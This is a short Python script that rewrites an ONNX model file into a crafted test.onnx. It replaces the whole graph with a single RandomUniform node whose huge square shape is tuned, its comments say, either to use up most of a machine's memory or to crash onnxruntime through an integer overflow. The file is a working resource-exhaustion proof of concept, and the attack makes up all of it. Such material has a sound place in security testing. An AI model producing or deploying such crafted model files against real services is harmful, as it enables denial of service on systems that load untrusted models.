import onnx_ml_pb2 as onnx
# load the bytes as protobuf
# build.bat creates the python protobuf spec from onnx
# github
data = open("model_quantized.onnx",'rb').read()
a = onnx.ModelProto()
a.ParseFromString(data)

# helper founction for debugging. Sort of like
# dir but for protobuf objects
def printFieldNames(pro):
    fields = [field.name for field in pro.DESCRIPTOR.fields]
    print(fields)

# delete all graph nodes
while len(a.graph.node) > 0:
    a.graph.node.pop()

# add a graph node that creates a num by num tensor of random data
# for max memory usagen and run time
#   sqrt(system mem / 4)
#   on 256GB system 200000 uses ~200GB
# for a crash
#   Something larger than (sqrt of system memory)/2
#   2147483647/2
#   1073741823
# 2147483647 as num causes onnxruntime::OnnxRuntimeException>::SafeIntOnOverflow
num = 266144
a.graph.node.append(
    onnx.NodeProto(
        op_type= "RandomUniform",
        name="fun0",
        output=["fun1"],
        attribute=[
            onnx.AttributeProto(
                name="shape",
                type=onnx.AttributeProto.INTS,
                ints=[num,num]
            ),
        ]
    )
)

# change the graph output to be the random data
a.graph.output[0].name="fun1"
a.graph.output[0].type.tensor_type.shape.dim[0].dim_value=num
a.graph.output[0].type.tensor_type.shape.dim[1].dim_value=num

# delete all value info
while len(a.graph.value_info) > 0:
    a.graph.value_info.pop()

# delete all initializer data
while len(a.graph.initializer) > 0:
    a.graph.initializer.pop()

# delte all input data
while len(a.graph.input) > 0:
    a.graph.input.pop()

# create the onnx file
data = a.SerializeToString()
open('test.onnx','wb').write(data)